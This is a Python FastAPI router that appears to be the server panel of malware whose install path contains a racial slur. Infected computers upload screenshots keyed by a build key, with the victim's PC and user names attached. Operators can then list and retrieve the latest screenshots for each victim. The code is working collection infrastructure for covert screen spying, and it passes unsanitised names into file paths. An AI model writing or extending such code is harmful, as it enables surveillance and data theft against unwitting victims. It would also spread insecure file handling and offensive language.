from typing import Any
from fastapi import APIRouter, Depends, HTTPException, Request
from fastapi.responses import Response, FileResponse
from sqlalchemy.orm import Session
from app.api import deps
from app.core.database import get_db
from app.models.user import User, Log
import json
import base64
import os
import time
import glob

router = APIRouter()

# Screenshots directory
DATA_DIR = "/opt/niggaware/new_panel/data"

@router.post("/upload/{build_key}")
async def upload_screenshot(
    build_key: str,
    request: Request,
    db: Session = Depends(get_db),
) -> Any:
    """Receive screenshot upload - saves to FILE, NOT database!"""
    user = db.query(User).filter(User.build_key == build_key).first()
    if not user:
        raise HTTPException(status_code=404, detail="Invalid build key")

    try:
        data = await request.json()
    except:
        raise HTTPException(status_code=400, detail="Invalid JSON")

    pc_name = data.get("pc_name", "Unknown")
    pc_user = data.get("pc_user", "Unknown")
    image_b64 = data.get("image", "")
    
    if not image_b64:
        raise HTTPException(status_code=400, detail="No image data")

    # Save to FILE only - NOT database!
    screenshot_dir = os.path.join(DATA_DIR, build_key, "screenshots")
    os.makedirs(screenshot_dir, exist_ok=True)
    
    filename = f"screenshot_{int(time.time())}_{pc_name}.png"
    filepath = os.path.join(screenshot_dir, filename)
    
    try:
        # Remove data URL prefix if present
        if "," in image_b64:
            image_b64 = image_b64.split(",")[1]
        
        img_data = base64.b64decode(image_b64)
        with open(filepath, "wb") as f:
            f.write(img_data)
    except Exception as e:
        return {"success": False, "error": str(e)}

    return {"success": True, "file": filename}


@router.get("/latest/{player_name}")
def get_latest_screenshot(
    player_name: str,
    current_user: User = Depends(deps.get_current_user),
    db: Session = Depends(get_db),
) -> Any:
    """Get the latest screenshot for a player from files"""
    # Get build_key for user
    build_key = current_user.build_key
    screenshot_dir = os.path.join(DATA_DIR, build_key, "screenshots")
    
    if not os.path.exists(screenshot_dir):
        return {"success": False, "error": "No screenshots found"}
    
    # Find screenshots matching player name
    pattern = os.path.join(screenshot_dir, f"*{player_name}*.png")
    files = glob.glob(pattern)
    
    if not files:
        # Try all screenshots if no match
        files = glob.glob(os.path.join(screenshot_dir, "*.png"))
    
    if not files:
        return {"success": False, "error": "No screenshots found"}
    
    # Get latest file
    latest = max(files, key=os.path.getmtime)
    filename = os.path.basename(latest)
    
    return {
        "success": True,
        "file": filename,
        "path": latest
    }


@router.get("/image/{filename}")
def get_screenshot_image(
    filename: str,
    current_user: User = Depends(deps.get_current_user),
):
    """Get screenshot image by filename"""
    build_key = current_user.build_key
    filepath = os.path.join(DATA_DIR, build_key, "screenshots", filename)
    
    if not os.path.exists(filepath):
        raise HTTPException(status_code=404, detail="Screenshot not found")
    
    return FileResponse(filepath, media_type="image/png")


@router.get("")
def list_screenshots(
    current_user: User = Depends(deps.get_current_user),
    limit: int = 50,
) -> Any:
    """List all screenshots from files"""
    build_key = current_user.build_key
    screenshot_dir = os.path.join(DATA_DIR, build_key, "screenshots")
    
    if not os.path.exists(screenshot_dir):
        return {"success": True, "screenshots": []}
    
    files = glob.glob(os.path.join(screenshot_dir, "*.png"))
    files.sort(key=os.path.getmtime, reverse=True)
    files = files[:limit]
    
    screenshots = []
    for f in files:
        filename = os.path.basename(f)
        mtime = os.path.getmtime(f)
        
        # Parse player/pc_name from filename: screenshot_timestamp_PlayerName.png
        player = "Unknown"
        try:
            parts = filename.split('_')
            if len(parts) >= 3:
                # Join remaining parts in case name has underscores
                player = "_".join(parts[2:]).replace('.png', '')
        except:
            pass

        screenshots.append({
            "file": filename,
            "player": player,
            "created_at": time.strftime("%Y-%m-%dT%H:%M:%S", time.localtime(mtime))
        })
    
    return {"success": True, "screenshots": screenshots}
